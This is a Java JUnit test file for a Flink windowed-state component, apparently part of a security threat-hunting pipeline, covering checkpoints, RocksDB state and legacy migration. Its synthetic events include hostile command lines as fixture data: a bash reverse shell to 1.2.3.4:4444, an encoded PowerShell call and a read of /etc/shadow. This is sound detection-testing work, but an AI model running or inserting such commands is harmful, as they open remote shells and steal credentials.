package com.sls.hunter.flink;

import static org.junit.jupiter.api.Assertions.*;

import java.time.Instant;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.TreeSet;

import org.apache.flink.api.common.state.MapState;
import org.apache.flink.api.common.state.MapStateDescriptor;
import org.apache.flink.api.common.typeinfo.Types;
import org.apache.flink.api.java.tuple.Tuple2;
import org.apache.flink.configuration.Configuration;
import org.apache.flink.contrib.streaming.state.EmbeddedRocksDBStateBackend;
import org.apache.flink.runtime.checkpoint.OperatorSubtaskState;
import org.apache.flink.runtime.state.VoidNamespace;
import org.apache.flink.runtime.state.VoidNamespaceSerializer;
import org.apache.flink.streaming.api.functions.KeyedProcessFunction;
import org.apache.flink.streaming.api.operators.KeyedProcessOperator;
import org.apache.flink.streaming.runtime.streamrecord.StreamRecord;
import org.apache.flink.streaming.util.KeyedOneInputStreamOperatorTestHarness;
import org.apache.flink.util.Collector;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class WindowBucketStateTest {
    private static final long START = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
    private static final String SHELL = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1";

    private static final class Probe extends KeyedProcessFunction<String, Event, String> {
        final boolean history;
        transient WindowBucketState state;

        Probe(boolean history) {
            this.history = history;
        }

        @Override
        public void open(Configuration ignored) {
            state = new WindowBucketState(getRuntimeContext(), history);
        }

        @Override
        public void processElement(Event event, Context ctx, Collector<String> out) throws Exception {
            out.collect(Boolean.toString(state.add(WindowMining.windowStart(event.time, 60_000), event, 2000000)));
        }
    }

    private static KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness(Probe probe, boolean rocks) throws Exception {
        KeyedOneInputStreamOperatorTestHarness<String, Event, String> h =
                new KeyedOneInputStreamOperatorTestHarness<>(new KeyedProcessOperator<>(probe), e -> e.family, Types.STRING);
        if (rocks) h.setStateBackend(new EmbeddedRocksDBStateBackend(true));
        return h;
    }

    private static Event event(String family, int index) {
        // Arrival order differs from event time, including ties, across part boundaries.
        Event event = new Event();
        event.family = family;
        event.id = "event-" + index;
        event.time = START + (500 - index) % 100;
        event.day = "2026-06-10";
        event.fields.put("host_ip", "10.0.0." + (index % 3));
        event.fields.put("username", "root");
        event.fields.put("proc_name", family.equals("tracing_sas_win") ? "powershell.exe" : "bash");
        event.fields.put("cmdline", index % 17 == 0 ? SHELL : index % 19 == 0
                ? "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA" : index % 23 == 0
                ? "cat /etc/shadow" : "echo variant" + index);
        event.fields.put("cmd_chain", "[{\"1\":\"/bin/bash\"}]");
        event.fields.put("uri", "/api/" + index);
        event.fields.put("upstream_addr", "10.0.0." + (index % 7) + ":80");
        return event;
    }

    private static void send(KeyedOneInputStreamOperatorTestHarness<String, Event, String> h, Event event) throws Exception {
        h.processElement(new StreamRecord<>(event));
    }

    private static void addReference(DayBucket bucket, Event event, boolean history) {
        if (history) {
            if (bucket.addWindowHistory(event)) WindowMining.recordHighRisk(bucket, event);
        } else bucket.add(event, false);
    }

    private static void assertBucketEquals(DayBucket expected, DayBucket actual) {
        assertEquals(new TreeSet<>(expected.identities), new TreeSet<>(actual.identities));
        assertEquals(expected.procHosts, actual.procHosts);
        assertEquals(expected.fetchParentPaths, actual.fetchParentPaths);
        Map<String, Object> left = Json.map(Json.write(expected));
        Map<String, Object> right = Json.map(Json.write(actual));
        left.remove("identities");
        right.remove("identities");
        left.remove("procHosts");
        right.remove("procHosts");
        left.remove("fetchParentPaths");
        right.remove("fetchParentPaths");
        assertEquals(left.keySet(), right.keySet());
        left.forEach((key, value) -> assertEquals(value, right.get(key), key));
    }

    @Test
    void multiplePartsPreserveEveryRuleInputAndScoreForBothModesAndAllFamilies() throws Exception {
        for (boolean history : new boolean[]{false, true}) {
            Properties p = new Properties();
            p.setProperty("history.compare", Boolean.toString(history));
            MiningConfig config = new MiningConfig(p);
            for (String family : Event.FAMILIES) {
                Probe probe = new Probe(history);
                DayBucket expected = new DayBucket();
                try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(probe, false)) {
                    h.open();
                    for (int i = 0; i < 3 * WindowBucketState.PART_EVENTS + 7; i++) {
                        Event e = event(family, i);
                        send(h, e);
                        addReference(expected, e, history);
                    }
                    DayBucket actual = probe.state.read(START);
                    assertBucketEquals(expected, actual);
                    MiningEngine.Result left = history ? WindowMining.evaluateChannels(family, expected,
                            Collections.singletonList(new DayBucket()), true, config)
                            : WindowMining.evaluate(family, expected, LocalDate.parse("2026-06-10"), config);
                    MiningEngine.Result right = history ? WindowMining.evaluateChannels(family, actual,
                            Collections.singletonList(new DayBucket()), true, config)
                            : WindowMining.evaluate(family, actual, LocalDate.parse("2026-06-10"), config);
                    assertEquals(Json.write(left.signals()), Json.write(right.signals()));
                    assertEquals(left.stats(), right.stats());
                    assertEquals(Json.write(left.shallow()), Json.write(right.shallow()));
                }
            }
        }
    }

    private static <K, V> MapState<K, V> state(KeyedOneInputStreamOperatorTestHarness<String, Event, String> h,
                                               MapStateDescriptor<K, V> descriptor) throws Exception {
        return h.getOperator().getKeyedStateBackend().getPartitionedState(
                VoidNamespace.INSTANCE, VoidNamespaceSerializer.INSTANCE, descriptor);
    }

    private static void requireBackend(boolean rocks) {
        if (rocks) {
            try {
                org.rocksdb.RocksDB.loadLibrary();
            } catch (LinkageError unavailable) {
                Assumptions.assumeTrue(false, "RocksDB native runtime unavailable: " + unavailable.getMessage());
            }
        }
    }

    @ParameterizedTest
    @ValueSource(booleans = {false, true})
    void appendsLeaveCompletedPartsUnchangedAndNeverCreateAWholeWindowJson(boolean rocks) throws Exception {
        requireBackend(rocks);
        Probe probe = new Probe(false);
        try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(probe, rocks)) {
            h.open();
            for (int i = 0; i < WindowBucketState.PART_EVENTS; i++) send(h, event("tracing_sas_linux", i));
            MapState<Tuple2<Long, Long>, String> parts = state(h, new MapStateDescriptor<>(
                    "fixed-window-parts-v1", Types.TUPLE(Types.LONG, Types.LONG), Types.STRING));
            String complete = parts.get(Tuple2.of(START, 0L));
            assertEquals(WindowBucketState.PART_EVENTS,
                    Json.MAPPER.readValue(complete, DayBucket.class).events);
            for (int i = WindowBucketState.PART_EVENTS; i < 2 * WindowBucketState.PART_EVENTS + 1; i++) {
                send(h, event("tracing_sas_linux", i));
                assertEquals(complete, parts.get(Tuple2.of(START, 0L)));
            }
            assertEquals(1, Json.MAPPER.readValue(parts.get(Tuple2.of(START, 2L)), DayBucket.class).events);
            assertNull(state(h, new MapStateDescriptor<>("fixed-window-bucket-v1", Types.LONG, Types.STRING)).get(START));
            send(h, event("tracing_sas_linux", 0));
            assertEquals("false", h.extractOutputValues().get(h.extractOutputValues().size() - 1));
            assertEquals(2L * WindowBucketState.PART_EVENTS + 1, probe.state.read(START).events);
        }
    }

    @ParameterizedTest
    @ValueSource(booleans = {false, true})
    void checkpointRestorePreservesPartialPartsAndIdentityScope(boolean rocks) throws Exception {
        requireBackend(rocks);
        for (boolean history : new boolean[]{false, true}) {
            DayBucket expected = new DayBucket();
            OperatorSubtaskState checkpoint;
            Probe before = new Probe(history);
            try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(before, rocks)) {
                h.open();
                for (int i = 0; i < WindowBucketState.PART_EVENTS + 3; i++) {
                    Event e = event("tracing_sas_linux", i);
                    send(h, e);
                    addReference(expected, e, history);
                }
                checkpoint = h.snapshot(1, 1);
            }
            Probe after = new Probe(history);
            try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(after, rocks)) {
                h.initializeState(checkpoint);
                h.open();
                send(h, event("tracing_sas_linux", 0));
                assertEquals("false", h.extractOutputValues().get(0));
                Event next = event("tracing_sas_linux", 999);
                next.time = START + 500;
                send(h, next);
                addReference(expected, next, history);
                assertBucketEquals(expected, after.state.read(START));
                Event otherWindow = event("tracing_sas_linux", 0);
                otherWindow.time += 60_000;
                send(h, otherWindow);
                assertEquals(1, after.state.read(START + 60_000).events);
                send(h, event("tracing_sas_win", 0));
                assertEquals(1, after.state.read(START).events);
            }
        }
    }

    @ParameterizedTest
    @ValueSource(booleans = {false, true})
    void legacyCheckpointIsIndexedOnceAndCleanupRemovesAllWindowState(boolean rocks) throws Exception {
        requireBackend(rocks);
        for (boolean history : new boolean[]{false, true}) {
            Probe before = new Probe(history);
            DayBucket expected = new DayBucket();
            for (int i = 0; i < 15; i++) {
                Event e = event("tracing_sas_linux", i);
                expected.add(e, false);
                if (history) WindowMining.recordHighRisk(expected, e);
            }
            OperatorSubtaskState checkpoint;
            try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(before, rocks)) {
                h.open();
                h.getOperator().setCurrentKey("tracing_sas_linux");
                state(h, new MapStateDescriptor<>("fixed-window-bucket-v1", Types.LONG, Types.STRING))
                        .put(START, Json.write(expected));
                checkpoint = h.snapshot(1, 1);
            }
            Probe after = new Probe(history);
            try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(after, rocks)) {
                h.initializeState(checkpoint);
                h.open();
                send(h, event("tracing_sas_linux", 0));
                assertEquals("false", h.extractOutputValues().get(0));
                if (history) expected.compactWindowHistory();
                String base = state(h, new MapStateDescriptor<>("fixed-window-bucket-v1", Types.LONG, Types.STRING)).get(START);
                for (int i = 15; i < 15 + WindowBucketState.PART_EVENTS + 3; i++) {
                    Event e = event("tracing_sas_linux", i);
                    send(h, e);
                    addReference(expected, e, history);
                }
                assertEquals(base, state(h, new MapStateDescriptor<>("fixed-window-bucket-v1", Types.LONG, Types.STRING)).get(START));
                assertBucketEquals(expected, after.state.read(START));
                assertEquals(Collections.singletonList(START), list(after.state.keys()));
                after.state.remove(START);
                assertFalse(after.state.contains(START));
                assertTrue(list(after.state.keys()).isEmpty());
                assertTrue(state(h, new MapStateDescriptor<>("fixed-window-parts-v1",
                        Types.TUPLE(Types.LONG, Types.LONG), Types.STRING)).isEmpty());
                assertTrue(state(h, new MapStateDescriptor<>("fixed-window-identities-v1",
                        Types.TUPLE(Types.LONG, Types.STRING), Types.BOOLEAN)).isEmpty());
                send(h, event("tracing_sas_linux", 0));
                assertEquals(1, after.state.read(START).events);
            }
        }
    }

    private static <T> List<T> list(Iterable<T> values) {
        List<T> result = new ArrayList<>();
        values.forEach(result::add);
        return result;
    }
}
